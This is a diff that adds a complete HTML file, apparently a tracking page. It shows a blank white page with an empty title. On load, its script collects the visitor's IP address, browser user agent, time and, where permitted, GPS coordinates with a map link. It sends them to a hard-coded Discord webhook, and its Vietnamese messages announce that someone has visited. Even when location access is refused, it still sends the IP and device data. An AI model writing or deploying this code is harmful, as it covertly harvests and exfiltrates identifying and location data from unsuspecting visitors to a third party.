@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+  <style>
+    body {
+      margin: 0;
+      background: white;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    const webhookURL = "https://discordapp.com/api/webhooks/1360121704810287134/XK9peo8xM6lxItpRKsVoEWaEQnJroxGy28LiiiDvN4A209ECo71wKkj8vft4qRQTLv_g";
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(ipData => {
+        const ip = ipData.ip;
+        const userAgent = navigator.userAgent;
+        const time = new Date().toLocaleString();
+
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          const message = {
+            content: `🛰️ Ai đó vừa vào web trắng!\n\n` +
+                     `📍 **Vị trí**:\n- Vĩ độ: ${lat}\n- Kinh độ: ${lon}\n` +
+                     `🗺️ [Xem trên bản đồ](https://maps.google.com/?q=${lat},${lon})\n\n` +
+                     `🌐 **IP**: ${ip}\n` +
+                     `💻 **Thiết bị**: ${userAgent}\n` +
+                     `🕒 **Thời gian**: ${time}`
+          };
+
+          fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(message)
+          });
+        }, function(err) {
+          const message = {
+            content: `⚠️ Ai đó vừa vào web nhưng **không cho phép truy cập vị trí**.\n\n` +
+                     `🌐 **IP**: ${ip}\n` +
+                     `💻 **Thiết bị**: ${userAgent}\n` +
+                     `🕒 **Thời gian**: ${time}`
+          };
+
+          fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(message)
+          });
+        });
+      });
+  </script>
+</body>
+</html>
